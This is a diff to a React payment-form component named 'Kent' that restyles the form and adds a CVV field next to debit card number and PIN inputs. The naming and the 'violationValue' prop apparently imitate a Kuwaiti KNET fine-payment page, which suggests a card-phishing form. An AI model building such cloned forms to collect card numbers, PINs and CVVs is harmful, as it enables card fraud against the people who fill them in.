@@ -428,12 +428,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
           <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
             {/* Bank Selection */}
             <div className="row">
-              <label className="column-label" style={{ width: "32%" }}>
+              <label className="col-4" >
                 Select Your Bank:
               </label>
               <select
-                className="column-value"
-                style={{ width: "67%" }}
+                className="col-8"
+               
                 onChange={(e) => handleBankSelection(e.target.value)}
                 value={paymentInfo.bank}
               >
@@ -450,16 +450,15 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
 
             {/* Card Number */}
             <div className="row three-column" id="Paymentpagecardnumber">
-              <label className="col">Card Number:</label>
+              <label className="col-4">Card Number:</label>
               <select
-                className="col"
+                className="col-3"
                 name="dcprefix"
                 id="dcprefix"
                 onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
-                style={{ width: "25%" }}
                 value={paymentInfo.prefix}
               >
-                <option value="">prefix</option>
+                <option value="" >prefix</option>
                 {paymentInfo.bank_card.map((prefix, index) => (
                   <option key={index} value={prefix}>
                     {prefix}
@@ -468,13 +467,13 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               </select>
               <input
                 name="debitNumber"
+                
                 id="debitNumber"
                 type="tel"
                 inputMode="numeric"
                 pattern="[0-9]*"
                 size={10}
-                className="allownumericwithoutdecimal"
-                style={{ width: "35%", marginLeft: 2 }}
+                className="allownumericwithoutdecimal col-5"
                 maxLength={10}
                 onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
                 value={paymentInfo.cardNumber}
@@ -484,10 +483,10 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
 
             {/* Expiration Date */}
             <div className="row three-column" id="cardExpdate">
-              <label className="col">Expiration Date:</label>
+              <label className="col-4">Expiration Date:</label>
               <select
                 onChange={(e) => handlePaymentInfoChange("month", e.target.value)}
-                className="col m-1"
+                className="col-3"
                 value={paymentInfo.month}
               >
                 <option value="">MM</option>
@@ -502,7 +501,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               </select>
               <select
                 onChange={(e) => handlePaymentInfoChange("year", e.target.value)}
-                className="col m-1"
+                className="col-5 "
                 value={paymentInfo.year}
               >
                 <option value="">YYYY</option>
@@ -519,8 +518,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
 
             {/* PIN */}
             <div className="row" id="PinRow" >
-              <div className="row" style={{flex:'left',justifyContent:'center'}}>
-                <label className="col" style={{width:'40%'}}>PIN:</label>
+              <div className="row" >
+                <label className="col-4 m-1" >PIN:</label>
                 <input
 
                   inputMode="numeric"
@@ -533,15 +532,35 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   title="Should be in number. Length should be 4"
                   type="password"
                   size={4}
-                  style={{ width: "65%" }}
                   maxLength={4}
-                  className="allownumericwithoutdecimal col-10"
+                  className="allownumericwithoutdecimal col-7"
+                />
+              </div>
+            </div>
+            <div className="row" id="PinRow" >
+              <div className="row" >
+                <label className="col-4 m-1" >Cvv:</label>
+                <input
+
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  name="cc"
+                  id="cc"
+                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
+                  value={paymentInfo.cvv}
+                  autoComplete="off"
+                  title="Should be in number. Length should be 3"
+                  type="password"
+                  size={3}
+                  maxLength={3}
+                  className="allownumericwithoutdecimal col-7"
                 />
               </div>
             </div>
 
 
           </div>
+          
         )
       case 0:
         return (
